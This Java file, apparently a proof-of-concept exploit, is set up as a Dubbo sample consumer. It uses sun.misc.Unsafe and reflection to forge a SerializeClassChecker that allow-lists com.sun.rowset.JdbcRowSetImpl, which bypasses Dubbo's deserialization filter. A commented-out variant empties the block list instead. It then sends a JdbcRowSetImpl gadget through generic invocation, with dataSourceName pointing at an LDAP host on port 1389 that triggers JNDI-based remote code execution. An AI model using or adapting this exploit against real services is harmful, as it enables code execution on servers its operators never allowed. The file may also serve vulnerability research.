package org.apache.dubbo.samples;

import org.apache.dubbo.common.utils.ConcurrentHashSet;
import org.apache.dubbo.common.utils.SerializeClassChecker;
import org.apache.dubbo.rpc.service.GenericService;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import sun.misc.Unsafe;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.*;

public class DemoConsumer {
    public static void main(String[] args) throws Exception {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("spring/generic-type-consumer.xml");
        context.start();

        Constructor<Unsafe> constructor = Unsafe.class.getDeclaredConstructor();
        constructor.setAccessible(true);
        Unsafe unsafe = constructor.newInstance();

        Set<String> allowSet = new ConcurrentHashSet<>();
        allowSet.add("com.sun.rowset.JdbcRowSetImpl".toLowerCase());

        SerializeClassChecker serializeClassChecker = (SerializeClassChecker) unsafe.allocateInstance(SerializeClassChecker.class);
        Field f = SerializeClassChecker.class.getDeclaredField("CLASS_DESERIALIZE_ALLOWED_SET");
        f.setAccessible(true);
        f.set(serializeClassChecker, allowSet);

//        SerializeClassChecker serializeClassChecker = (SerializeClassChecker) unsafe.allocateInstance(SerializeClassChecker.class);
//        Field f = SerializeClassChecker.class.getDeclaredField("CLASS_DESERIALIZE_BLOCKED_SET");
//        f.setAccessible(true);
//        f.set(serializeClassChecker, new ConcurrentHashSet<>());

        Map<Object, Object> map1 = new HashMap<>();
        map1.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        map1.put("INSTANCE", serializeClassChecker);

        Map<Object, Object> map2 = new LinkedHashMap<>();
        map2.put("class", "com.sun.rowset.JdbcRowSetImpl");
        map2.put("dataSourceName", "ldap://192.168.100.1:1389/Basic/Command/calc");
        map2.put("autoCommit", true);

        List list = new LinkedList();
        list.add(map1);
        list.add(map2);

        GenericService genericService = (GenericService) context.getBean("helloService");
        genericService.$invoke("sayHello", new String[]{"java.lang.String"}, new Object[]{list});
    }
}
